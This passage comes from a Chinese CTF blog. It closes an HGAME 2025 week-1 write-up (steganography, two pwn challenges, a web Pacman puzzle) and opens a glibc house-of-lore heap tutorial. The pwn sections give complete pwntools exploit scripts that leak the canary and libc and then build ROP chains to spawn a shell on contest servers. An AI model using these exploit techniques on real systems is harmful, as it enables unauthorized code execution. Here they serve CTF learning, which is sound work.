class="line"></span><br></pre></td></tr></table></figure><ul><li>然后使用<code>010editor</code>查看这个二进制文件，发现好像是<code>zip</code>的文件头</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102513784.png" alt="image-20250211102513784"></p><ul><li>所以把文件的后缀改为<code>zip</code>，就会发现压缩包中有flag，但是需要密码</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102606282.png" alt="image-20250211102606282"></p><ul><li>这时再翻到这个文件二进制形式的结尾，发现这边是个png头颠倒过来。</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102712572.png" alt="image-20250211102712572"></p><ul><li>所以就再将这个二进制位倒序输出到另一个文件中。这时就会出现一个<code>png</code>的图片</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102834269.png" alt="image-20250211102834269"></p><ul><li>再使用<code>010editor</code>打开该<code>png</code>文件，发现格式<code>png</code>的格式有点问题</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103056770.png" alt="image-20250211103056770"></p><ul><li>这时我们尝试修改图片的宽、高，原宽高为</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103159833.png" alt="image-20250211103159833"></p><ul><li>修改后的宽高为</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103221069.png" alt="image-20250211103221069"></p><ul><li>打开修改后的图片就会发现密码</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103239610.png" alt="image-20250211103239610"></p><ul><li>这时就能解密压缩包了，这样就可以得到<code>flag</code>文件了</li><li>flag：<code>hagme&#123;h4kyu4_w4nt_gir1f3nd_+q_931290928&#125;</code></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103319652.png" alt="image-20250211103319652"></p><h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a>counting petals</h2><ul><li>先来查看一下保护机制，发现保护全开</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211103849211.png" alt="image-20250211103849211"></p><ul><li>反编译一下该程序，分析程序逻辑。<ul><li>先初始化一下输入、输出，然后再生成一个随机数。</li><li>接下来要求用户输入一个数，这个数<code>小于等于16</code></li><li>这个我们就可以对<code>v7</code>这个数组进行输入（注意这边可以对数组越界访问，可以覆盖其他地址的值）</li><li>然后对<code>v7[0]</code>这个地方进行修改</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211104018739.png" alt="image-20250211104018739"></p><ul><li>之后的程序执行流程如下：<ul><li>会逐个输出<code>v7</code>数组中的值（这里可能会因为数组的越界访问，会导致地址的泄露），并且将这些值加入到<code>v7[0]</code>中</li><li>还会将之前的一个随机数加到<code>v7[0]</code>上</li><li>检查<code>v7[0]</code>的最后1位是否为<code>0</code>，如果为<code>0</code>就会退出循环</li><li>还会检查<code>v4</code>是否大于0，如果<code>v4大于0</code>也会退出循环</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211104510357.png" alt="image-20250211104510357"></p><ul><li>接下来进行动态调试，现在发现在循环的时候我们写入栈中的数据范围如下，这时我们可以溢出图中箭头指向的位置。之后我们就可以通过之后的循环加法输出从而泄露栈</li><li>图中箭头指向的位置刚好是变量<code>v8</code>、变量<code>v5</code>所存储的位置，低地址为变量<code>v8</code>，高地址为变量<code>v9</code></li><li>这里还要注意一下，虽然是<code>scanf(&quot;%ld&quot;)</code>,但是可以读入8字节的整数，这时我们需要溢出修改<code>v9</code>、<code>v8</code>的值然后就可以进行泄露。</li><li>这里还要注意一点就是<code>v8</code>的值一定要小于<code>v9</code>这样才会跳出循环，所以我构造<code>85899345939</code>即（<code>0x1400000013</code>）</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211105451616.png" alt="image-20250211105451616"></p><ul><li>之后就可以泄露<code>canary</code>、<code>libc</code>的地址，之后会再一次循环，这次循环我们修改<code>v8</code>、<code>v9</code>的值为<code>-8589934569</code>即（<code>0xFFFFFFFE00000017</code>）这时我们就可以修改<code>v4</code>使其大于0，这样必然可以退出循环，不必考虑随机数的问题</li><li>之后我们修改<code>v8</code>、<code>v9</code>我们的循环此时还没退出，还要继续输入，这时我们再趁机修改<code>v8</code>、<code>v9</code>的值为<code>73014444057</code>（即<code>0x11 0000 0019</code>）</li><li>这样我们就可以构造<code>rop</code>链，从而getshell</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.hgame.vidar.club&#x27;</span>,<span class="number">30149</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;this time?\n&#x27;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;85899345939&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">result = p.recvline()</span><br><span class="line">result = result.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">canary = result[<span class="number">16</span>]</span><br><span class="line">libc_start = result[<span class="number">18</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">canary = <span class="built_in">int</span>(canary,<span class="number">10</span>)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">10</span>)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary---&gt;&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_start---&gt;&quot;</span>,<span class="built_in">hex</span>(libc_start))</span><br><span class="line">libc_addr = libc_start - <span class="number">0x29D90</span></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x000000000002a3e5</span> <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x50D70</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1D8678</span></span><br><span class="line">ret = libc_addr + <span class="number">0x0000000000029139</span><span class="comment"># : ret</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;this time?\n&#x27;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;-8589934569&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;73014444057&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(ret&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(pop_rdi&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(sh_addr&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;flower number&#x27;</span>,<span class="built_in">str</span>(sys_addr&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211122353599.png" alt="image-20250211122353599"></p><h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><ul><li>这题的泄露地址和<code>XYCTF</code>中的一题比较像，先来查看一下保护机制，发现没有开<code>pie</code>和<code>canary</code></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211110918764.png" alt="image-20250211110918764"></p><ul><li>接下来反编译分析一下程序<ul><li>该程序会先让我们读入，我们格式化输入输出的此时，注意这边有字符串格式化漏洞（这边需要使用<code>%p</code>泄露栈地址），因为<code>scanf(&quot;%3s&quot;)</code>已经限制了输入只能3个字符（所以不能使用<code>%7$p</code>）</li><li>之后又存在一个栈溢出<code>v5</code>这边是<code>int</code>类型</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211112623739.png" alt="image-20250211112623739"></p><ul><li>但是<code>vuln</code>这边对于参数传递过去的<code>v5</code>就会变成<code>unsigned int</code>类型</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211115311207.png" alt="image-20250211115311207"></p><ul><li>这就会导致溢出，接下来我们进行动态调试，由动态调试可以得知，我们<code>read(0,buf,a1)</code>中<code>buf</code>的位置在栈上中上面一个红色框的范围中</li><li>我们注意到<code>printf(format)</code>中的<code>format</code>存储在箭头指向的地址，此时我们就可以先通过栈溢出，修改<code>format</code>的值为<code>%9$p</code>，从而泄露libc的地址，并且这时候在<code>format</code>之前会覆盖返回地址，这时我们覆盖返回地址为<code>0x4012CF</code>,这样我们就可以泄露libc地址，并且还可以重新再利用<code>read</code>进行一次栈溢出，从而构造<code>rop</code>链getshell</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211115533200.png" alt="image-20250211115533200"></p><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211115959467.png" alt="image-20250211115959467"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.227.88&#x27;</span>,<span class="number">31314</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;n =&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;type something:&#x27;</span>,<span class="string">b&#x27;%p\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;you type:&#x27;</span>)</span><br><span class="line">stack = p.recvline()[<span class="number">1</span>:<span class="number">15</span>]</span><br><span class="line">stack = <span class="built_in">int</span>(stack,<span class="number">16</span>) + <span class="number">8496</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack---&gt;&#x27;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;n =&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaaa&#x27;</span>+p64(stack)+p64(<span class="number">0x4012CF</span>)+<span class="string">b&#x27;%9$p&#x27;</span>+p32(<span class="number">0xffffffff</span>)+p64(<span class="number">0x100000001</span>)</span><br><span class="line"><span class="comment">#payload+=b&#x27;aaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaa&#x27;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;type something:&#x27;</span>)</span><br><span class="line">libc_start = p.recvline()[:<span class="number">14</span>]</span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">16</span>)</span><br><span class="line">libc_addr = libc_start - <span class="number">0x29D90</span></span><br><span class="line">ogg = libc_addr + <span class="number">0xebd43</span></span><br><span class="line">ret = libc_addr + <span class="number">0x29139</span></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2a3e5</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x50D70</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1D8678</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;start-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_start))</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#p.sendlineafter(b&#x27;n =&#x27;,b&#x27;-1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>+p64(stack)+p64(ret)+p64(pop_rdi)+p64(sh_addr) +p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211122315674.png" alt="image-20250211122315674"></p><h1 id="web"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="level-24-pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h2><ul><li>打开靶机，发现游戏题，直接去看<code>js</code>。一开始是在<code>inpage.js</code>这边看<code>js</code>，发现并没有什么与flag相关的东西。</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132119348.png" alt="image-20250206132119348"></p><ul><li>这时候去看<code>html</code>文件，发现还引用了三个<code>js</code>文件，逐一排查文件</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132222228.png" alt="image-20250206132222228"></p><ul><li>最后发现<code>flag</code>藏在<code>index.js</code>文件中，搜索<code>flag</code>发现没结果，但是在这边看到了一个<code>gift</code></li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132414923.png" alt="image-20250206132414923"></p><ul><li>这时在搜素<code>gift</code>发现还有二个</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132528103.png" alt="image-20250206132528103"></p><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206132548797.png" alt="image-20250206132548797"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gift:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br><span class="line">gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br><span class="line">gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br></pre></td></tr></table></figure><ul><li><code>base64</code>解码后得到：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br></pre></td></tr></table></figure><ul><li>栅栏密码解密后如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;u_4re_pacman_m4ster&#125;</span><br><span class="line">hgame&#123;pratice_makes_perfect&#125;</span><br><span class="line">hgame&#123;pratice_makes_perfect&#125;</span><br></pre></td></tr></table></figure><ul><li>提交后发现正确的flag为这个：</li></ul><p>flag：<code>hgame&#123;u_4re_pacman_m4ster&#125;</code></p>]]></content>
    
    
    <summary type="html">打了打hg的week1,PWn有一题牢不出来QAQ,ROP链不知道怎么构造</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-lore</title>
    <link href="http://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/"/>
    <id>http://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/</id>
    <published>2025-02-11T16:53:32.000Z</published>
    <updated>2025-03-05T10:18:37.444Z</updated>
    
    <content type="html"><![CDATA[<ul><li>这个堆利用就需要伪造堆块了，<code>house of lore</code>这个利用方式只对<code>glibc2.23-glibc2.31</code> 之间的这个版本</li><li><code>glibc2.31</code>以上的版本<code>house of lore</code>的利用方式基本失效。</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li><p>这里也统一认知，之前介绍了在堆块的物理地址中<code>高地址</code>为前，<code>低地址</code>为后，接下来对堆块的逻辑地址的前后进行一个认知的统一。</p></li><li><p>通常在释放的堆块如果被<code>bins</code>管理，他们都会将<code>fd</code>指针和<code>bk</code>指针给利用起来，之前一直没搞明白<code>fd</code>指针指向前面还是后面，<code>bk</code>指针指向前面还是后面。</p></li><li><code>fd</code>指针的全称为<code>forward pointer</code>，<code>bk</code>指针的全称为<code>backward pointer</code>。在<code>fastbin</code>和<code>tcachebin</code>中我们使用了<code>fd</code>指针，并且这个时候<code>fd</code>指针都指向的是远离<code>bins</code>堆块的方向。这边就以<code>tcache_bins</code>的图片为例子。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250219120847941.png" alt="image-20250219120847941"></p><ul><li>所以这次我们对逻辑地址做一个认知统一。<ul><li>远离<code>bins</code>的堆块是更前面的堆块，所以<code>fd</code>指针指向的是远离<code>bins</code>的堆块</li><li>靠近<code>bins</code>的堆块是更后面的堆块，所以<code>bk</code>指针指向的是靠近<code>bins</code>的堆块</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250219121132346.png" alt="image-20250219121132346"></p><h2 id="smallbin机制"><a href="#smallbin机制" class="headerlink" title="smallbin机制"></a>smallbin机制</h2><ul><li>这里为了能更好的理解<code>house of lore</code>接下来就要了解一下<code>smallbin</code>这个<code>bins</code>的运行机制，这样更有利于我们学习<code>house of lore</code></li><li>之前我们释放的堆块基本上都是被放入<code>fastbin</code>、<code>tachacbin</code>、<code>unsortedbin</code>，这三个bins中，很少有见到释放的堆块被放入<code>smallbin</code>中。所以我们先研究一下怎样才能使得被释放的堆块放入<code>smallbin</code>中。</li><li><code>smallbin</code>是一个双向循环链表的结构，并且<code>smallbin</code>是一个长为<code>64</code>的一个数组。在相关宏定义中这个<code>#define NSMALLBINS 64</code>可以知道是<code>64</code>个堆块的数组。</li><li><p>从<code>malloc.c</code>中的这个结构体定义中<code>struct malloc_state</code>还可以得知<code>mchunkptr bins[NBINS * 2 - 2];</code>，这个堆块长度为<code>254</code>长度，其中包含了<code>smallbin</code>和<code>largebin</code>。</p><ul><li>注意：<strong>这里会存在一个误区，这边的bins既然是254个元素是否与之前unlink 图片所说的largebins和smallbins的个数不一样</strong></li><li>注意：<strong>由于smallbins和largebins是一个双向链表结构，而bins数组中的每一个元素相当与一个指针，为了使得bins能够有两个指针，所以对应smallbins[0]它会将bins[0]作为fd指针,bins[1]作为bk指针，利用这种方式构造一个双向头结点</strong></li></ul></li><li><p>从<code>62-63</code>行代码的宏定义<code>in_smallbin_range</code>可以得知，<code>chunk_size＜MIN_LARGE_SIZE</code>即在<code>64</code>位系统中小于<code>0x400</code>大小的chunk都会被放入<code>smallbin</code>的堆块里面，在<code>32</code>位系统中小于<code>0x200</code>大小的chunk都会被放入<code>smallbin</code>的堆块里面（在相关代码中的宏定义有做具体介绍）</p></li><li>从<code>66-68</code>行代码的宏定义<code>smallbin_index</code>可以得知，每个相邻<code>smallbin</code>存储的空闲堆块size位在<code>64</code>位中相差<code>0x10</code>字节，在<code>32</code>位中相差<code>0x8</code>字节</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 堆块结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 堆块结构和堆块指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="comment">// 两个数组宏定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里面有定义着smallbin和largebin的数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span 